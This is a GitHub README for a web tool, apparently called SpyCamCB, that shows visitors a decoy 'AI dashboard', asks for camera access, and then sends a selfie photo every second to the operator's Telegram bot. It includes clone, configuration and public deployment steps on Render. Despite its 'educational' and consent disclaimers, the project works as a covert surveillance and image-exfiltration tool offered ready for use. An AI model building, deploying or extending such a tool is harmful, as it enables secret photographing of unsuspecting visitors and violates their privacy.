# 📷 ShiPu Ai Camera Logger (Educational Project)

This is an educational project demonstrating how a website can request camera access from a visitor's browser, capture images at regular intervals using the selfie camera, and transmit them securely to a Telegram bot using Node.js and the Telegram Bot API.

> ⚠️ This project is intended **strictly for educational and research purposes**. Always ask for permission and inform users before accessing their camera.

---

## 🔍 What This Project Does

- Launches a modern AI-style dashboard web interface
- Displays a camera permission request popup
- If granted, starts using the front camera to capture images
- Sends the images (one per second) to a Telegram bot
- Fully responsive UI, ideal for demo or research setup

---

## 🧱 Tech Stack

- HTML5 + JavaScript (Camera & Canvas API)
- Node.js + Express (Backend API)
- Telegram Bot API (Image delivery)

---

## 🖥️ How to Use This Repository

### 1. Clone the Project

```bash
git clone https://github.com/brandchitron/SpyCamCB.git
cd SpyCamCB
```

---

### 2. Install Node.js Dependencies

```bash
npm install
```

---

### 3. Configure Telegram Bot

Open `index.js` and update the following lines with your Telegram Bot API token and your personal Telegram user ID:

```js
const BOT_TOKEN = "your-bot-token-here";
const CHAT_ID = "your-user-id-here";
```

- Create a Telegram bot via [@BotFather](https://t.me/BotFather)
- Get your user ID by messaging your bot once, then visit:
  ```
  https://api.telegram.org/bot<YOUR-TOKEN>/getUpdates
  ```

---

### 4. Run the Server

```bash
npm start
```

This will start the local server at:

```
http://localhost:3000
```

Open it in any modern browser (preferably mobile) to begin the camera capture process.

---

### 5. Deploy Online (Render)

To make this website publicly accessible:

- Push this repo to GitHub
- Go to [https://render.com](https://render.com)
- Click **New Web Service**
- Connect your GitHub repo
- Use the following settings:
  - **Environment:** Node
  - **Build Command:** `npm install`
  - **Start Command:** `npm start`
  - **Root directory:** leave blank
- Deploy and open the URL Render gives you

---

## ✏️ Customize Capture Interval

To change how often images are captured (default is once per second), modify this line in `index.html`:

```js
setInterval(() => {
  // capture and send
}, 1000); // milliseconds
```

---

## 🎨 UI Customization

The HTML layout is in `index.html`. You can customize:

- Popup text (`authPopup`)
- AI dashboard layout
- Sidebar, stats, console simulation

---

## 🔐 Ethical Reminder

> 🔒 Always notify users that camera access is being requested. This project is intended for ethical experimentation, education, and consent-based use cases only.

Using such code without informing the user is a violation of privacy, browser security policies, and likely your local laws.

---

## 👨‍💻 Author

Developed for educational purposes by **Chitron Bhattacharjee**

Feel free to contribute, fork, or ask questions.  
Telegram: [@brandchitron](https://t.me/brandchitron)